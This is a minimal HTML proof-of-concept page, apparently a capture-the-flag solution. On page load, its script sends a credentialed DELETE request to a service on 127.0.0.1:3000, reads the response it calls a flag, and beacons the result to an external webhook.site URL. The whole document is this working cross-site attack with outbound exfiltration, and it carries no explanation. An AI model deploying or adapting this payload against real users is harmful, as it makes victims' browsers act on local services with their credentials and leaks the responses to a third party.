<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>poc</title>
</head>
<body>
  <script>
    (async () => {
      const beacon = (msg) => {
        // signal out regardless of result
        (new Image()).src =
          'https://webhook.site/2c8771d5-e4a6-46a9-920e-779f60801182/collect?f=' +
          encodeURIComponent(msg);
      };

      try {
        const r = await fetch('http://127.0.0.1:3000/reach_nirvana', {
          method: 'DELETE',
          credentials: 'include',
        });

        // Try to read the body; if CORS blocks, still signal success
        let flag = '';
        try {
          flag = await r.text();
        } catch (_) {
          flag = 'sent_but_cors_blocked_read';
        }

        beacon(flag || 'empty_response');
        if (flag) document.title = flag;
      } catch (e) {
        beacon('err');
      }
    })();
  </script>
</body>
</html>
